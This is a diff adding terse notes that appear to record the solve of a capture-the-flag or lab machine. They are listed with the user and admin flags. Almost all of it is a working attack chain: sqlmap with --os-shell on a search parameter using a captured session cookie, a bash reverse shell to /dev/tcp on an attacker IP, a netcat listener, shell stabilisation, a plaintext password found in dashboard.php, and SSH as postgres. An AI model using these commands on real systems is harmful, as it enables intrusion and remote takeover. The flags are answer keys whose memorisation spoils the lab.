@@ -1,0 +1,26 @@
+USER:
+
+ec9b13ca4d6229cd5cc1e09980965bf7
+
+
+sqlmap -u 'http://10.129.24.21/dashboard.php?search=any+query' --cookie="PHPSESSID=em7nto6nkodiatjtiar9sva5c6" --os-shell
+
+bash -c "bash -i >& /dev/tcp/10.10.16.38/443 0>&1"
+
+sudo nc -lvnp 443
+
+python3 -c 'import pty;pty.spawn("/bin/bash")'
+CTRL+Z
+stty raw -echo
+fg
+export TERM=xterm
+
+la pass è in chiaro nel file dashboard.php -> P@s5w0rd!
+
+ssh postgres@10.129.24.21
+
+
+
+ADMIN:
+
+dd6e058e814260bc70e9bbdef2715849
